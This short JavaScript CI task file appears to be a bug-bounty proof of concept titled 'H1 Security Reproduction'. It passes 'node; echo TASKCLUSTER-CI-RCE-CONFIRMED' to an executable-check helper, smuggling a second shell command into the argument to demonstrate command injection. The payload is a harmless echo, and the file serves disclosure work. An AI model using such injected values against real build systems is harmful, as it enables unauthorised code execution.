import { checkExecutableExists } from '../../utils/index.js';

export const tasks = [{
  title: 'H1 Security Reproduction',
  requires: [],
  provides: ['poc-verified'],
  run: async () => {
    console.log("--- START OF SECURITY POC ---");
    await checkExecutableExists("node; echo TASKCLUSTER-CI-RCE-CONFIRMED");
    console.log("--- END OF SECURITY POC ---");
    return { 'poc-verified': true };
  }
}];
